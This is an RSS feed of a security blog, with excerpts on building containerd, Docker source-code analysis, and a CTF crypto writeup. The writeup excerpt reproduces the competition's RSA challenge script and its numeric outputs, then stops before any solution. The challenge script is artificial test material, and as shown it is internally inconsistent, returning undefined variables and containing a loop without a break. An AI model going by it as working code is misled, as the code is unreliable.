<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Post on welcome to st0n3&#39;s blog</title>
    <link>/post.html</link>
    <description>Recent content in Post on welcome to st0n3&#39;s blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Fri, 12 Aug 2022 08:53:33 +0000</lastBuildDate><atom:link href="/post/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>How to Build Containerd</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/containerd/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/%E5%A6%82%E4%BD%95%E5%BC%80%E5%8F%91%E5%B9%B6%E7%BC%96%E8%AF%91%E4%BB%A3%E7%A0%81/How-to-Build-Containerd.html</link>
      <pubDate>Fri, 12 Aug 2022 08:53:33 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/containerd/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/%E5%A6%82%E4%BD%95%E5%BC%80%E5%8F%91%E5%B9%B6%E7%BC%96%E8%AF%91%E4%BB%A3%E7%A0%81/How-to-Build-Containerd.html</guid>
      <description>tags: containerd, container How to Build Containerd containerd没有提供编译环境，本文分析如何使用官方的构建环境编译containerd。
1. Normal 根据官方文档, 一步一步来即可编译containerd。
1. 安装依赖
安装golang, btrfs等依赖
2. 下载代码
git clone https://github.com/containerd/containerd.git cd containerd git checkout v1.6.7 3. 修改代码
sed -i &#39;s/app.Name = &amp;quot;containerd&amp;quot;/app.Name = &amp;quot;containerd-st0n3&amp;quot;/g&#39; cmd/containerd/command/main.go 4. 编译
make 5. binary
编译好的二进制文件，位于bin目录
# ./bin/containerd -v containerd-st0n3 github.com/containerd/containerd v1.6.7.m 0197261a30bf81f1ee8e6a4dd2dea0ef95d67ccb.m 2. Build in a container 2.1 Github action release 上文描述的是自行搭建编译环境进行编译的过程，但可能与官方release环境不同，所以我们需要理解官方是在什么环境中编译containerd。
containerd使用github action自动进行release版本的构建：
https://github.com/containerd/containerd/runs/7681874106?check_suite_focus=true
github action的源码核心部分如下：
https://github.com/containerd/containerd/blob/v1.6.7/.github/workflows/release.yml
on: push: tags: - &amp;#39;v*&amp;#39; # Push events to matching v*, i.</description>
    </item>
    
    <item>
      <title>强网杯-Qualifier-2022/Crypto/Factor writeup</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/crypto/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/RSA/Prime-Power-RSA/%E5%BC%BA%E7%BD%91%E6%9D%AF-Qualifier-2022/Crypto/Factor/%E5%BC%BA%E7%BD%91%E6%9D%AF-Qualifier-2022CryptoFactor-writeup.html</link>
      <pubDate>Wed, 03 Aug 2022 02:27:24 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/crypto/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/RSA/Prime-Power-RSA/%E5%BC%BA%E7%BD%91%E6%9D%AF-Qualifier-2022/Crypto/Factor/%E5%BC%BA%E7%BD%91%E6%9D%AF-Qualifier-2022CryptoFactor-writeup.html</guid>
      <description>强网杯-Qualifier-2022/Crypto/Factor writeup 本文是赛后复盘完成的，比赛时没有找到对应的论文。
1. challenge  附件下载 提取码（GAME）
 下载得到附件task.py。
 点击查看task.py #encoding:utf-8 from Crypto.Util.number import * from gmpy2 import * from random import randint from flag import flag def gen1(): r = 2 while True: p2 = getPrime(1792) p1 = getPrime(1792) q1 = getPrime(512) q2 = getPrime(512) if (abs(p1-p2) &amp;lt; (p1//(2*r*q1*q2))): n1, n2 = (p1**r)*q1, (p2**r)*q2 break phi1 = (p1**(r-1))*(p1-1)*(q1-1) phi2 = (p2**(r-1))*(p2-1)*(q2-1) while True: e1 = randint(5, (p1-1)*(q1-1)) e2 = randint(5, (p2-1)*(q2-1)) if gcd(e1, e2) == 1 and gcd(phi1, e1) == 1 and gcd(phi2, e2) == 1: break return n11, n12, e11, e12 def gen2(): r = 7 while True: p = getPrime(512) q =	getPrime(512) N = (p**r)*q if len(bin(N)) == 4096: break idx = (r*(r-1)) / ((r+1)*(r+1)) delta = int(pow(mpz(N), idx)) phi = (p**(r-1))*(p-1)*(q-1) while True: d1 = getPrime(int(2048*idx)//2) d2 = getPrime(int(2048*idx)//2) if abs(d1-d2) &amp;lt; delta: m1 = invert(d1, phi) m2 = invert(d2, phi) break e2 = 0x10001 return n2, e2, m1, m2 def gen3(): r = 7 while True: p = getPrime(512) q =	getPrime(512) N = (p**r)*q phi = (p**(r-1))*(p-1)*(q-1) if len(bin(N))-2 == 4096: break idx = (r*(r-1)) / ((r+1)*(r+1)) delta = int(pow(mpz(N), idx)) while True: b = getRandomNBitInteger(int(2048*idx)//2) a = getRandomNBitInteger(int(2048*idx)//2) if a*b &amp;lt; delta: e = invert(a, phi)*b return n3, e3, b n11, n12, e11, e12 = gen1() print(f&amp;#34;n11={n11}\nn12={n12}\ne11={e11}\ne12={e12}\n&amp;#34;) n2, e2, m1, m2 = gen2() print(f&amp;#34;n2={n2}\ne2={e2}\n&amp;#34;) n3, e3, b = gen3() print(f&amp;#34;n3={n3}\ne3={e3}\n&amp;#34;) m3 = bytes_to_long(flag) c11 = powmod(m1, e11, n11) c12 = powmod(m2, e12, n12) c2 = powmod(b, e2, n2) c3 = powmod(m3, e3, n3) print(f&amp;#34;c11={c11}\nc12={c12}\nc2={c2}\nc3={c3}\n&amp;#34;) &amp;#39;&amp;#39;&amp;#39; n11=801049932940568005269978912396585741498810389425615966036828877784238116634177290247194019425111606811005728521368879065336038221361037062407029836155148874719789714345603547779284558101833801155509762818376470874215789574939002212274399950433269775325144015468620263028557804618774240232988157961712628677901130814703917513004114547234375629747176834581166306552311075522669403347828095831520693563291249869832390698646691647204371133362254846234990175138047928703289833460734235302093916147489509206061923877623300596194317059884824322527532662470348274079800781120104946546063500763852622187404608639542858285661288293918912184354236687975919510300221932074135531028314170475917110204254042336116619335841213418990605590620842511615815443114612333881430920769002933370887494558640833005339906706603497809846863863967391543647049224309556936909768179259581851520214669904560467640473144481633920438487615788689262961741053146610554997224861331949716721056553499531186695425439163222802917813140266513735841447717418846360096652592844940362932171019143434080184728093326143821165097895058935372215708948088248596585127475770021962501262915274497478428868130455122612016408381607561200802267038869516896665387576895570245272035575637 n12=635401970340205725139325006504978344512744926958688031423448003992072769931808217486709574151492230879374574313457662436423263437792389711379687512056391117410807565492548718691166183372633151644917135272259770997096195518489056319350258673723095417922153182423913759272893696867426193704479752772511081457729513843682588951499551132432923147997238597538055902932123792252593514225328196541483451747314048080824405530742533473914329294346486691684904100406972073037050089861816604505650042953778360621934380815999541183067585498606053857125775979915077329566722531830089714823979965934190338538564188253271016367299890015449611141166780048763403252309160517164569110740561584100839212138661881615351382946813818078899882595313362934594951895560189003438775450675343590147821186953526262224973333962454561275321925151619178204499342339749637758100126893330994252902926509705617882239610380420830791088907378397226817514095468815228186716220057075095711894070032344613244803934541318573847029365563159918970404057137270884587905766828750387753130065274147902379993224780149663600462492281891320702134153853359393588902750423972068679293373333869389393970353760507436913233657422185531482023237384247535554666481760197851108297145147371 e11=1898839980562048754607069073527844852132536432440793106124181406514770178066775988232362054809850074774981836898118651469424148725970708199461113088705044905633592578936333918328544505910996746428679299419879472444790941363558025887620570856598548320246426354974395765243741646121743413447132297230365355148066914830856904433750379114692122900723772114991199979638987571559860550883470977246459523068862898859694461427148626628283198896659337135438506574799585378178678790308410266713256003479022699264568844505977513537013529212961573269494683740987283682608189406719573301573662696753903050991812884192192569737274321828986847640839813424701894578472933385727757445011291134961124822612239865 e12=1262647419018930022617189608995712260095623047273893811529510754596636390255564988827821761126917976430978175522450277907063247981106405519094560616378241247111698915199999363948015703788616554657275147338766805289909261129165025156078136718573006479030827585347458143645738353716189131209398056741864848486818076440355778886993462012533397208330925057305502653219173629466948635110352752162442552541812665607516753186595817376029707777599029040724727499952161261179707271814405907165207904499722122779096230563548011491932378429654764486855147873135769116637484240454596231092684424572258119768093562747249251518965380465994055049411715353547147466711949391814550591591830515262296556050946881 n2=209798341155088334158217087474227805455138848036904381404809759100627849272231840321985747935471287990313456209656625928356468120896887536235496490078123448217785939608443507649096688546074968476040552137270080120417769906047001451239544719039212180059396791491281787790213953488743488306241516010351179070869410418232801398578982244984544906579574766534671056023774009163991804748763929626213884208260660722705479782932001102089367261720194650874553305179520889083170973755913964440175393646890791491057655226024046525748177999422035469428780228224800114202385209306803288475439775037067014297973202621118959024226798935588827359265962780792266516120013602384766460619793738405476219362508944225007365127768741191310079985425349292613888185378948854602285379329682053663283534930182589905986063348509703027498270111412063194971956202729807710253369312175636837558252924035002153389909587349043986253518050303628071319876207392440085675892353421232158925122721273720564784886530611286461575045181073744696415657043278123662980166364494583141297996445429477446442693717498789391918530672770193730629928408766563592081857706608049076318165712479742423149330311238462044666384622153280310696667586565906758451118241914402257039981388209 e2=65537 n3=539779851369541956878655738599584730199799866957191805784596190682932284216781781433367450841202917758999300635019369629627621029957135109806205877317954671312041249493462048283611940752235036153024920172209763260723728345918562258401803973624430150143563078517485996070862532682695228590709019451174548520135142052216785774589096706631010293690859363524584240662502290912412366366114571976050857239915691266377257797199583543940504695517331512813468837128344612227973709974625418257243011036826241599265375741977853552204640800449679679351666009764297016524814036295707311913711955324055690490892097177271718850857268982130811714517356073266905474635370690445031512184247179039751734276906533177939993769044135143389748416635981226449566039039202521305851567296884751935162651063209779647359922622084851547605090230221057349511482738300221222563908357379545905837110168948295030747460300104202323692732549831403834387939156877086852393515817984772384147449841124275061609701453997579569931391166586163299940486204581696722731952467570857217406030804590055255431828403195798003509083922294733709507134156466158642941338493323430671502043066148246348074878064089651235355282144209668143249348243220714471988019011613749340243917652821 e3=8179300978753084587812861894047395225516049110376948812109811319430275614612773726672345893359691900281432484382670047044697374818043512731533402576374645405477207239801498428774783768163880078495448747421425078521981578408638790336528372019271073712013371141939808017049399434858687299480461753638164719404612128939787055797762174745092074547412183349192156638711750872083313795551439465507724807626674514935170104573715458782366469587138508845980490673890245713729782917089910271980557159592807350504157192913530007199510144004848020221181558472160543018733124225266127379373751910439604459368078652499029070936707349862139053913745186413782066470461478961703013591655136140060879250067379283913798867648758171004535775565306842444545755351202796833177560656564652632975685912935281581268141803696686952259539945588609591385807620108279333498170028167338690235117003515264281843953984997958878272347778561933726792473981855755454522886321669676790813189668084373153897754540290867346751033567500922477317530445967753955221454744946208555394588111484610700789566547507402309549957740815535069057837915204852490930168843605732632328017129154852857227895362549146737618906180651623216848500491438142456250653458053922622240299736136335179639180898730269690699965799644757774472147210271111150769048976871249731156387939260749192370361488285775377622944817570292095201906142567403539151179209316853493906909989301225903409448461436855145 c11=18979511327426975645936984732782737165217332092805655747550406443960209507493506811471688957217003792679188427155591583024966608843371190136274378868083075515877811693937328204553788450031542610082653080302874606750443090466407543829279067099563572849101374714795279414177737277837595409805721290786607138569322435729584574023597293220443351227559400618351504654781318871214405850541820427562291662456382362148698864044961814456827646881685994720468255382299912036854657082505810206237294593538092338544641919051145900715456411365065867357857347860000894624247098719102875782712030938806816332901861114078070638796157513248160442185781635520426230183818695937457557248160135402734489627723104008584934936245208116232179751448263136309595931691285743580695792601141363221346329077184688857290503770641398917586422369221744736905117499140140651493031622040723274355292502182795605723573863581253354922291984335841915632076694172921289489383700174864888664946302588049384130628381766560976143458735712162489811693014419190718601945154153130272620025118408017441490090252674737105557818759190934585829634273698371996797545908125156282869589331913665938038870431655063063535672001112420959158339261862052308986374193671007982914711432579c12=336587005671304527566745948355290412636261748969581976214239578621816863343117433524033533838636941679300497270909696775021031004312477997130741361709262822736904340641138652359632950455651920464042448022467664596484055174270895170499076347333381222768518599018520948098943626229061996126260154604038101543546588917619576702866444998578555907070990331574722135141778182631559802154493815687284077524469331290249057291163803290619701104007028836609832847351748020354798788508790258935718399783002069490123663345156902440501507117289747695510266461539019431610123351176227443612317037899257774045751487135646052309277098939919088029284437221840182769808850184827681307611389353392683707516141736067793897378911235819049432542758429901945202632117089595899280390575706266239252841152490534353760118231918190110043319877744119083811214707593122757409240645257409097436061825613686773916466122693168971062418046703969144004779270391320645495586024342668002497155358623795942692477164489475917351003149045087283510728981096449890130735055015075557614253867698702479920619299919816768972581273507837309179450374634916567083251630203067065663910073926990517108921490442919372774170201239734064819301693527366233007925670043499415100789027665 c2=18352572608055902550350386950073774530453857897248738030380007830701135570310622004368605208336922266513238134127496822199799761713782366178177809597137102612444147565578155260524747439899150012223027218489946124086276814899675563837669559795153349686434242738207425653079514376089070980797596457151965772460109519623572502109592612394316680202287712465721767341302234806130244551387296133051760893033194962691942040228545508895009195291106297581470066545991352668826197346830561010198417527057944507902143965634058848276017283478933675052993657822322866778994956205033704582047618324071045349072526540250707463112668579342537349567247810715604220690215313641329522674080146047291570752430231923566302463491877377617044768978997438596643458475128936850994934029476030136643053997549253792076260765459166618369864942681056864815996253315631930002738854235841120321870075261782250357506436825550088826469396508045912258303652912217151127280959435741419961721418428605515096160344688795655562889755165362006775317188009008288782691705879510655892181975003485714604340542378477388225736316682379616676770234557939471098919647053799313777248678455620231721202780830980063824003076308811540534492317719811588898727134190545533822501681653 c3=113097822337683973761068913398570777162211043704088253732500045618770280334319497174908657828372816818344430304314992760410247741225285170975119344962728883084314382093407445567724674775086423808679124143380073906159023182353116556175251427048715466914368972746661938211846262612414049036821553068430149530397389927209475908905748728402722287875974303298260579839357610962198145974153609818939841880084892796820949226354126424023144300953584658958900737493704530725894948802258740332090822797815745616247879170037794873059391625680745994045522420168248552864215035136318711240256011217929372430302003068882829637056296413462078222453765071094277727760527662423010417144554652783429899139309180017349156600053882338180319473460877576898373222480215735280046214925463242092830060830764299787309912687294672319845054775281463150375545716818434962456139485501224661520991156961587158843064393883274763714930309353593180897123378717852182761518709151878662808890356934477932099818218743384674756674800089177733447066489275506387382342429495897972218764782517198727316942685748481956118012927027254979181519862451112593068440686462293151078537886822555211870303467014484443432209106264020502334805536091587252238173816637270028678636848763 &amp;#39;&amp;#39;&amp;#39;  2.</description>
    </item>
    
    <item>
      <title>docker 创建oci运行时配置 源码分析</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-container/docker-container-start-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-%E5%88%9B%E5%BB%BAoci%E8%BF%90%E8%A1%8C%E6%97%B6%E9%85%8D%E7%BD%AE-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</link>
      <pubDate>Fri, 27 May 2022 03:13:52 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-container/docker-container-start-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-%E5%88%9B%E5%BB%BAoci%E8%BF%90%E8%A1%8C%E6%97%B6%E9%85%8D%E7%BD%AE-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</guid>
      <description>tags: container,docker,源码分析 docker 创建oci运行时配置 源码分析 1. 简介 OCI(Open Container Initiative)是一个开放的治理结构，其围绕容器格式和运行时创建了开放的行业标准。OCI于2015年6月由Docker和容器行业的其他领导者成立，目前包含两个规范：运行时规范（runtime-spec）和图像规范（image-spec）。
本文分析容器启动时，docker如何创建运行时配置(runtime-spec)。
2. 入口 这一过程发生在docker启动容器过程中，即docker container start时，前部分流程分析可以参见docker container start 源码分析。
入口位于Daemon.createSpec方法，创建符合oci标准的容器配置，后续该配置将被传递给oci。
https://github.com/moby/moby/blob/master/daemon/start.go#L153-L156
func (daemon *Daemon) containerStart(container *container.Container, checkpoint string, checkpointDir string, resetRestartManager bool) (err error) { ... spec, err := daemon.createSpec(container) if err != nil { return errdefs.System(err) } ... } https://github.com/moby/moby/blob/v20.10.14/daemon/oci_linux.go#L1008
func (daemon *Daemon) createSpec(c *container.Container) (retSpec *specs.Spec, err error) { var ( opts []coci.SpecOpts s = oci.DefaultSpec() ) opts = append(opts, WithCommonOptions(daemon, c), WithCgroups(daemon, c), WithResources(c), WithSysctls(c), WithDevices(daemon, c), WithUser(c), WithRlimits(daemon, c), WithNamespaces(daemon, c), WithCapabilities(c), WithSeccomp(daemon, c), WithMounts(daemon, c), WithLibnetwork(daemon, c), WithApparmor(c), WithSelinux(c), WithOOMScore(&amp;amp;c.</description>
    </item>
    
    <item>
      <title>docker container start 源码分析</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-container/docker-container-start-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</link>
      <pubDate>Fri, 27 May 2022 03:12:55 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-container/docker-container-start-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</guid>
      <description>tags: docker,container,源码分析 docker container start 源码分析  本文编写时，最新release为v20.10.14, 下文涉及代码均为该版本的代码。  1. docker container start 简介 启动容器，通过docker container start命令调用，该流程在运行容器时也会执行。
详见官方文档： https://docs.docker.com/engine/reference/commandline/container_start/
2. 源码入口位置 由cli接收docker container start命令参数,发送至docker engine api
cli与engine api的代码入口分别位于:
cli
https://github.com/docker/cli/blob/v20.10.14/cli/command/container/start.go#L29
func NewStartCommand(dockerCli command.Cli) *cobra.Command { ... }  engine
https://github.com/moby/moby/blob/v20.10.14/api/server/router/container/container.go#L54
func (r *containerRouter) initRoutes() { r.routes = []router.Route{ ... router.NewPostRoute(&amp;#34;/containers/{name:.*}/start&amp;#34;, r.postContainersStart), ... } } 3. cli docker使用 github.com/spf13/cobra 实现cli功能，NewStartCommand函数中定义了cobra.Command。该函数中用户输入的参数经cobra解析后，会被传给runStart函数。
https://github.com/docker/cli/blob/v20.10.14/cli/command/container/start.go#L38
func NewStartCommand(dockerCli command.Cli) *cobra.Command { ... cmd := &amp;amp;cobra.</description>
    </item>
    
    <item>
      <title>docker reexec docker-mountfrom 源码分析</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-reexec%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-reexec-docker-mountfrom-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</link>
      <pubDate>Wed, 18 May 2022 09:16:08 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-reexec%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-reexec-docker-mountfrom-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</guid>
      <description>tags: container,docker,源码分析 docker reexec docker-mountfrom 源码分析 本文中代码均为v20.10.6分支的代码。
1. 简介 docker-mountfrom 是 dockerd 的一个“子命令”，用于实现对相对目录的挂载。
2. 使用 2.1 代码使用 参考 docker reexec源码分析。
2.2 二进制使用 除了通过以类似fork的形式在代码中使用，docker-mountfrom 也可以通过二进制的形式使用，但这种形式不常见。这种使用方式的价值在于能方便得直接进入 docker-mountfrom 的逻辑，在分析其实现、或研究相关的安全问题时，比较方便、直观。
将 dockerd 复制一份，或建立软链接，得到名为 docker-mountfrom 的文件，dockerd 与 docker-mountfrom 的文件内容相同，通过执行时的不同的cmdline，进入不同的代码逻辑。
ln -s /usr/bin/dockerd /usr/bin/docker-mountfrom docker-mountfrom的stdin是json格式的配置选项，arg1是相对路径所在的目录。
echo &#39;{&amp;quot;device&amp;quot;:&amp;quot;shm&amp;quot;,&amp;quot;target&amp;quot;:&amp;quot;dst&amp;quot;,&amp;quot;type&amp;quot;:&amp;quot;tmpfs&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;&amp;quot;, &amp;quot;flag&amp;quot;:0}&#39; &amp;gt; /tmp/json mkdir /tmp/dst docker-mountfrom &amp;lt; /tmp/json /tmp 其中，配置选项的具体格式为：
type mountOptions struct { Device string Target string Type string Label string Flag uint32 } 3. 实现分析 docker-mountfrom命令被注册到 mountFromMain 函数。</description>
    </item>
    
    <item>
      <title>docker 路由框架 源码分析</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-%E8%B7%AF%E7%94%B1%E6%A1%86%E6%9E%B6-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</link>
      <pubDate>Thu, 05 May 2022 03:47:17 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-%E8%B7%AF%E7%94%B1%E6%A1%86%E6%9E%B6-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</guid>
      <description>tags: docker,container,源码分析 docker 路由框架 源码分析 https://github.com/moby/moby/blob/v20.10.14/api/server/server.go#L175
func (s *Server) createMux() *mux.Router { m := mux.NewRouter() ... for _, apiRouter := range s.routers { for _, r := range apiRouter.Routes() { f := s.makeHTTPHandler(r.Handler()) ... m.Path(versionMatcher + r.Path()).Methods(r.Method()).Handler(f) m.Path(r.Path()).Methods(r.Method()).Handler(f) } } ... } https://github.com/docker/cli/blob/v20.10.14/vendor/github.com/docker/docker/client/client.go#L188
func (cli *Client) getAPIPath(ctx context.Context, p string, query url.Values) string { ... if cli.version != &amp;#34;&amp;#34; { v := strings.TrimPrefix(cli.version, &amp;#34;v&amp;#34;) apiPath = path.Join(cli.basePath, &amp;#34;/v&amp;#34;+v, p) } else { apiPath = path.</description>
    </item>
    
    <item>
      <title>docker events 源码分析</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-events-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</link>
      <pubDate>Thu, 28 Apr 2022 08:44:51 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-events-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</guid>
      <description> tags: docker,container,源码分析 docker events 源码分析 </description>
    </item>
    
    <item>
      <title>docker container wait 源码分析</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-container/docker-container-wait-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</link>
      <pubDate>Thu, 28 Apr 2022 08:43:20 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-container/docker-container-wait-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</guid>
      <description> tags: docker,container,源码分析 docker container wait 源码分析 </description>
    </item>
    
    <item>
      <title>docker container remove 源码分析</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-container/docker-container-remove-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</link>
      <pubDate>Thu, 28 Apr 2022 08:41:34 +0000</pubDate>
      
